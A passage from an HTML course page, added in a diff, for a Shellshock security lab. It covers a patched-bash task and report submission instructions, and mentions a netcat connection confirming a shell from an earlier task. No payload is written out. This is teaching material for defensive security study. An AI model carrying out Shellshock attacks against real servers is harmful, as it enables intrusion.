+    This is confirmed via the <code class="language-plaintext highlighter-rouge">Connection from 10.0.2.5 ...</code> message displayed by <code class="language-plaintext highlighter-rouge">netcat</code>.</p>
+    
+      </div>
+    </div>
+    <!-- END Special Section -->
+    
+    <h3 id="task-5-using-the-patched-bash">Task 5: Using the Patched Bash</h3>
+    
+    <p>Now, let us use a version of the bash program that has already been patched.
+    The program <code class="language-plaintext highlighter-rouge">/bin/bash</code> is a patched version.</p>
+    
+    <p>On the SEED labs VM, replace the first line of the CGI programs <tt>(02_shellshock/image_www/vul.cgi)</tt> to have your CGI programs used the patched version of bash. Instead of <tt>#!/bin/bash_shellshock</tt>, you should change it to <tt>#!/bin/bash</tt>. After you save changes, you need to <b>rebuild</b> the docker container. Bring it down with <tt>docker-compse down</tt>, rebuild it with <tt>docker-compose build</tt> and then start it up again when <tt>docker-compose up -d </tt></p>
+    
+    <p>Repeat one of the subtasks from task 3 and describe your observations. </p>
+    
+    
+    
+    <!-- NOTE: This "stub" assumes that page.duedate and page.id variables are defined; the latter should be consistent with our directory naming scheme. -->
+
+
+
+
+
+
+
+
+<!-------------------------------------------->
+<!-------------------------------------------->
+<!-------------------------------------------->
+<!-------------------------------------------->
+<!-------------------------------------------->
+<!-------------------------------------------->
+
+
+
+<h4> Submission Instructions </h4>
+<p> The lab report is to help me see that you did the lab and followed the instructions. For each task, you should include a screenshot to show you completed the task. If the task asks you to write down observations, you should also include those in your lab report. For the tasks that requires you to do some thinking and find ways to exploit a program, you should write a brief description about your approach and the steps you took to get your output. This is a lab report taken from a previous offering of this course. This is a good example of how you should format your lab report: <a href="SampleLabReport.pdf">https://www.cs.montana.edu/pearsall/classes/spring2023/476/labs/SampleLabReport.pdf</a>
+
+    <br>
+
+    Once you are ready, submit your lab report <b> AS A PDF</b> to the appropriate D2L submission box.
+
+</p>
+
+</div>
+
+
+
+
+
+
+<div class="d-none d-xl-block col-xl-2">
+    
+    <nav id="toc" data-toggle="toc" class="sticky-top"></nav>
+    
+</div>
+
+</div>
+</div>
+
+<!-- Optional JavaScript for Bootstrap - jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+<script src="/cs476-2021-spring/assets/js/prism.js"></script>
+
+<script src="https://cdn.rawgit.com/afeld/bootstrap-toc/v1.0.1/dist/bootstrap-toc.min.js"></script>
+
+<script>
+$(document).ready(function() {
+    /*
+     * class hacking: add bootstrap/bootswatch class labels to my custom classes (notes, slides, etc.)
+     */
+
+    // admin styles
+    $('.new').addClass('badge badge-pill badge-primary');
+    $('.announcement').addClass('alert alert-primary').prepend('<h4 class="alert-heading">Class Announcement!</h4>');
+    $('.timestamp').prepend('&mdash;Posted ');
+    // $('.score').prepend(' &mdash; ');
+
+    // add icons / style class elements...
+    $( ".activity" ).each(function(index) {
+        $(this).html('<i class="fas fa-lightbulb pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".code" ).each(function(index) {
+        $(this).html('<i class="fas fa-file-code pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".slides" ).each(function(index) {
+        $(this).html('<i class="fas fa-file-pdf pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".pdf" ).each(function(index) {
+        $(this).html('<i class="fas fa-file pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".reading" ).each(function(index) {
+        $(this).html('<i class="fas fa-book pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+    $( ".video" ).each(function(index) {
+        $(this).html('<i class="fas fa-play-circle pl-1"></i> ' +$(this).html()+ '' );
+        $(this).attr('target', '_blank');
+    });
+
+    // add links to all section headers...
+    $( ":header" ).each(function(index) {
+      var attr = $(this).attr('id');
+      if (typeof attr !== typeof undefined && attr !== false) {
+        $(this).html( '<a href="#' + attr + '">' +$(this).html()+ ' </a>' );
+      }
+    });
+
+    // add links to weeks on schedule
+    $('td[id^="week"]').filter(function () {
+        $(this).html(function(index, text){
+            return '<a href="#' + text.toLowerCase().replace(' ', '') + '"><strong>' + text + '</strong></a>';
+        });
+    });
+
+    // use javascript to detect all external links and add the target='_blank' attribute to them.
+    // -> thanks, https://code.luasoftware.com/tutorials/hugo/how-to-create-link-with-target-blanks-in-hugo-markdown/
+    var links = document.getElementsByTagName("a");
+    for (var i = 0, linksLength = links.length; i < linksLength; i++) {
+        if (links[i].hostname != window.location.hostname) {
+            links[i].target = '_blank';
+        }
+    }
+
+});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    extensions: [
+      "MathMenu.js",
+      "MathZoom.js",
+      "AssistiveMML.js",
+      "a11y/accessibility-menu.js"
+    ],
+    jax: ["input/TeX", "output/CommonHTML"],
+    TeX: {
+      extensions: [
+        "AMSmath.js",
+        "AMSsymbols.js",
+        "noErrors.js",
+        "noUndefined.js",
+      ]
+    }
+  });
+  MathJax.Hub.Register.StartupHook("TeX Jax Ready",function () {
+    var TEX = MathJax.InputJax.TeX;
+    var COLS = function (W) {
+      var WW = [];
+      for (var i = 0, m = W.length; i < m; i++)
+        {WW[i] = TEX.Parse.prototype.Em(W[i])}
+      return WW.join(" ");
+    };
+    TEX.Definitions.Add({
+      environment: {
+        psmallmatrix: ['Array',null,'(',')','c',COLS([1/3]),".2em",'S',1],
+      }
+    });
+  });
+</script>
+<script type="text/javascript" async
+  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js">
+</script>
+
+</body>
+
+</html>
